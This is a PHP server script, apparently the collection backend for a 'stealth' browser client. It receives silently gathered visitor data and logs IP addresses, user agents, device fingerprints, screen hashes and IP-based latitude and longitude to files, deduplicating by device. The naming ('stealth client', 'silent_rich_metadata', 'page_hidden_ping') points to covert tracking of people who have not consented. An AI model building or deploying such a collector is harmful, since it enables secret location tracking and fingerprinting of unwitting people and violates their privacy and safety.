<?php
/**
 * save_location.php — Optimized for stealth client v2
 *
 * Migration Note:
 * ----------------
 * 2025-09-14
 * - Rewritten to support enhanced stealth client:
 *     • Deduplicates repeated events per client (5-minute window)
 *     • Saves structured metadata: IP, fingerprint, screen_hash, source, timestamp
 *     • Stores raw payload for forensic analysis
 *     • Supports all event types:
 *         - silent_rich_metadata
 *         - ip_geolocation
 *         - page_hidden_ping
 *     • Separate log for IP-based geolocation for easy analysis (ip.txt)
 *
 * Benefits:
 * - Reduces log clutter from repeated client events
 * - Makes analytics and unique-device counting much easier
 * - Fully compatible with stealth HTML client auto-run
 *
 * Note:
 * - File-based dedupe storage (seen_hashes.txt) is used
 * - Can be upgraded to Redis/MySQL for high-scale deployments
 */

date_default_timezone_set("UTC");

$LOG_DIR = '/opt/eyes/logs';
if (!is_dir($LOG_DIR)) mkdir($LOG_DIR, 0750, true);

// read input
$input = file_get_contents("php://input");
$data = json_decode($input, true);

// validate input
if (!is_array($data) || !isset($data['source']) || !isset($data['ts'])) {
    http_response_code(400);
    echo "invalid_payload";
    exit;
}

// client info
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

// extract fingerprint info
$fingerprint = $data['_fingerprint']['ua_hash'] ?? substr($ua, 0, 200);
$screen_hash = $data['_fingerprint']['screen_hash'] ?? '';
$source = $data['source'] ?? 'unknown';

// dedupe key: fingerprint + IP + source + 5-min time bucket
$bucket = floor(time() / 300); // 5-minute buckets
$hash = hash('sha256', "$ip|$source|$fingerprint|$screen_hash|$bucket");

// dedupe store file
$dedupe_file = "$LOG_DIR/seen_hashes.txt";
$seen_hashes = is_file($dedupe_file) ? file($dedupe_file, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES) : [];

if (!in_array($hash, $seen_hashes, true)) {
    // structured entry
    $entry = [
        'time' => gmdate("Y-m-d\TH:i:s\Z"),
        'ip' => $ip,
        'ua' => $ua,
        'source' => $source,
        'fingerprint' => $fingerprint,
        'screen_hash' => $screen_hash,
        'data' => $data
    ];

    // append to main log
    file_put_contents("$LOG_DIR/data.txt", json_encode($entry) . PHP_EOL, FILE_APPEND | LOCK_EX);

    // mark hash as seen
    file_put_contents($dedupe_file, $hash . PHP_EOL, FILE_APPEND | LOCK_EX);
}

// Optional: separate log for IP-based geolocation (easy analysis)
if ($source === 'ip_geolocation' && isset($data['ipinfo']['query'])) {
    $ip_entry = [
        'time' => gmdate("Y-m-d\TH:i:s\Z"),
        'ip' => $ip,
        'source' => 'ip_geolocation',
        'query' => $data['ipinfo']['query'],
        'lat' => $data['ipinfo']['lat'] ?? null,
        'lon' => $data['ipinfo']['lon'] ?? null
    ];
    file_put_contents("$LOG_DIR/ip.txt", json_encode($ip_entry) . PHP_EOL, FILE_APPEND | LOCK_EX);
}

// respond
http_response_code(200);
echo "ok";
